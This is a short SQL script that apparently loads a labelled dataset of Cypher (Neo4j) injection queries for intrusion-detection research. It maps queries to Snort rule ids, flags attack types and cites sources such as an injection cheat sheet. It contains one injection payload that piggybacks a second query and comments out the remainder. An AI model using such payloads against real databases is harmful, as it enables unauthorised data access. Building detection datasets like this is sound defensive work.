INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Return all Person nodes','MATCH (n:Person {}) CALL {MATCH(p:Person) RETURN p} RETURN p // } RETURN n',1, 100001, 'A study of NoSQL query injection in Neo4j.',1,0,1,0,0,0,0,0,0,0);

UPDATE CypherQuery
set SourceTxt = 'https://portal.graphgist.org/graph_gists/bank-fraud-detection/source'
where QueryId in (1,2);

UPDATE CypherQuery
set SourceTxt = 'https://pentester.land/blog/cypher-injection-cheatsheet'
where QueryId between 62 and 90;

UPDATE CypherQuery
set SourceTxt = 'https://neo4j.com/docs/cypher-cheat-sheet/5/auradb-enterprise/'
where QueryId between 91 and 155;